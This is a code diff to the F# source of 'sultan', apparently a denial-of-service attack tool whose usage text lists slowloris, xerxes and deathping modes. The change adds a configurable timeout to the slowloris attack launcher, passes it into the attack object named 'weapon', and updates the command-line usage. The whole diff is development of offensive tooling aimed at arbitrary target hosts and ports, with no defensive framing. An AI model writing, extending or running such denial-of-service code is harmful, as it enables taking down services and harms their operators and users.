@@ -14,12 +14,13 @@ module sultan =
     let E : string = string (char 0x1B)
     let invoke_slowloris (args : string[]) =
         let mutable usessl : bool = false
+        let mutable timeout : int = 120000
         if args.Length < 2 then
                 errorfn "100 Target host not provided. Aborting."
                 exit 1
                 else verbose "starting..."
         try
-            usessl <- System.Boolean.Parse(args.[4])
+            usessl <- System.Boolean.Parse(args.[5])
             ()
         with
             | :? ArgumentException as err ->
@@ -31,7 +32,20 @@ module sultan =
             | :? FormatException as err ->
                 warn "102 useSSL parameter was not in the correct format, defaulting to FALSE"
                 ()
-        let weapon = new sllib()
+        try
+            timeout <- System.Int32.Parse(args.[4])
+            ()
+        with
+            | :? ArgumentException as err ->
+                warn "103 timeout parameter is null, defaulting to 120000 ms"
+                ()
+            | :? IndexOutOfRangeException as err ->
+                warn "103 timeout parameter is null, defaulting to 120000 ms"
+                ()
+            | :? FormatException as err ->
+                warn "104 timeout parameter is not a valid number, defaulting to 120000 ms"
+                ()
+        let weapon = new sllib(timeout)
         weapon.attack(args.[1], System.Int32.Parse(args.[2]), usessl, System.Int32.Parse(args.[3]));
         Thread.Sleep(Timeout.Infinite);
         0
@@ -60,7 +74,7 @@ module sultan =
         printfn "sultan v0.3.0"
         printfn "MIT (c) %i LPTSTR members" year
         printf "\n"
-        printfn "Usage: .\sultan slowloris [host] [port] [socket_count] [useSSL? (true|false)]"
+        printfn "Usage: .\sultan slowloris [host] [port] [socket_count] [timeout] [useSSL? (true|false)]"
         printfn "Usage: .\sultan xerxes [host] [port] [connections] [threads]"
         printfn "Usage: .\sultan deathping [host]"
         printf "\n"
